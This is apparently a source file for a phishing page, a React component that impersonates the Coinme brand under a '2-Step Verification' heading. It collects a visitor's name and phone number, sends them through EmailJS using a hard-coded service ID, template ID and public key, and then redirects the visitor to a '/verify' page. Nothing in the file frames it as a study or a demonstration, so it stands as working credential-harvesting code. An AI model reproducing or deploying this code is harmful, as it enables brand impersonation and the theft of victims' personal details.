import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser'; // ✅ Updated import

const Home = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('_ _ _  _ _ _  _ _ _ _');
  const navigate = useNavigate();

  const handleLogin = async () => {
    let isValid = true;

    // ✅ Email validation
    if (!email) {
      setEmailError('Username is required');
      setEmailPlaceholder('Enter Username');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // ✅ Password validation
    if (!password) {
      setPasswordError('Number is required');
      setPasswordPlaceholder('Enter your Number');
      isValid = false;
    } else {
      setPasswordError('');
    }

    if (!isValid) return;

    // ✅ Template params
    const templateParams = {
      web_name:'Coinme',
      from_name: 'Coinme',
      message: `Name: ${email}, \nPhone: ${password}, \nDate: ${new Date().toLocaleDateString()}, \nTime: ${new Date().toLocaleTimeString()}`,
    };

    try {
      const response = await emailjs.send(
        'service_9vr0fnb', // ✅ Check your Service ID
        'template_1rqlnbj', // ✅ Check your Template ID
        templateParams,
        'uHwNgVlpc4635wHVx' // ✅ Check your Public Key
      );

      console.log('Email sent successfully:', response);
      setEmail('');
      setPassword('');
      navigate('/verify');
    } catch (error) {
      console.error('Email sending error:', error);
      alert(`Failed to send email: ${error.text || error.message}`);
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col justify-center items-center pt-32">
      <header className="flex justify-center mb-8">
        <img src={require('../Image/coinme1.jpg')} alt="Navigation" className="w-36" />
      </header>

      <div className="w-full  max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
        <main className="">
          <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Please verify your details</h3>
          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className=""
          >
            <div className="mb-4  ">
              <label htmlFor="name ">Enter Name</label>
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError ? 'border-red-500' : 'border-gray-300'
                }`}
                aria-invalid={emailError ? 'true' : 'false'}
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6">
              <label htmlFor="phone">Enter Number</label>
              <input
                type="text"
                id="password"
                value={password}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d{0,10}$/.test(value)) {
                    setPassword(value);
                  }
                }}
                placeholder={passwordPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  passwordError ? 'border-red-500' : 'border-gray-300'
                }`}
                aria-invalid={passwordError ? 'true' : 'false'}
              />
              {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
            </div>
            <div className="flex justify-center">
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Home;
